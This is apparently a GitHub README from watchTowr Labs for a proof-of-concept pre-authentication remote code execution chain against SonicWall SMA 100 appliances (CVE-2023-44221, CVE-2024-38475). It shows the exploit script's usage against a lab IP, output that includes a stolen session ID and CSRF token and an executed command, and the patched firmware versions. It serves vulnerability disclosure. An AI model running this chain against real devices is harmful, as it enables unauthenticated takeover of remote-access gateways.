# SonicWall SMA 100 PreAuth RCE Chain PoC

PoC for SonicWall SMA 100 PreAuth RCE Chain (CVE-2023-44221, CVE-2024-38475)
 
See our [blog post](https://labs.watchtowr.com/) for technical details


https://github.com/user-attachments/assets/b157b39c-d7bd-4385-af7a-e465f8fd4a41



# PoC in Action


```
python watchTowr-vs-SonicWall-PreAuth-RCE-Chain.py -t https://192.168.8.153/ -c ifconfig
                         __         ___  ___________
         __  _  ______ _/  |__ ____ |  |_\__    ____\____  _  ________
         \ \/ \/ \__  \    ___/ ___\|  |  \|    | /  _ \ \/ \/ \_  __ \
          \     / / __ \|  | \  \___|   Y  |    |(  <_> \     / |  | \/
           \/\_/ (____  |__|  \___  |___|__|__  | \__  / \/\_/  |__|
                                  \/          \/     \/

        watchTowr-vs-SonicWall-PreAuth-RCE-Chain.py

        (*) SonicWall Pre-Auth RCE Chain

          - Sina Kheirkhah (@SinSinology) of watchTowr (@watchTowrcyber)

        CVEs: [CVE-2023-44221, CVE-2024-38475]

[*] Database downloaded successfully as temp.db
[*] Session ID: eT0Hg7tYutyqs0e2ZuXbnnWfjZ0YGnzteRiu9AlMMVU=
[*] CSRF Token: 4fzPDyqMRiAmYY9M9zJU9CefZDqRyUPZ
[*] Session is valid.
[*] Command executed successfully.
<pre>eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 192.168.8.153  netmask 255.255.255.0  broadcast 192.168.8.255
        inet6 fe80::20c:29ff:fec9:f9e2  prefixlen 64  scopeid 0x20&lt;link&gt;
        ether 00:0c:29:c9:f9:e2  txqueuelen 1000  (Ethernet)
        RX packets 327943  bytes 143863046 (137.1 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 229647  bytes 334022494 (318.5 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 76818  bytes 30267068 (28.8 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 76818  bytes 30267068 (28.8 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

sh: &quot;: command not found

Traceroute6 complete.
</pre>
```

# Affected Versions

The two vulnerabilities impact SMA 200, SMA 210, SMA 400, SMA 410, and SMA 500v devices and are patched in firmware version 10.2.1.14-75sv and later.


# Follow [watchTowr](https://watchTowr.com) Labs

For the latest security research follow the [watchTowr](https://watchTowr.com) Labs Team 

- https://labs.watchtowr.com/
- https://x.com/watchtowrcyber

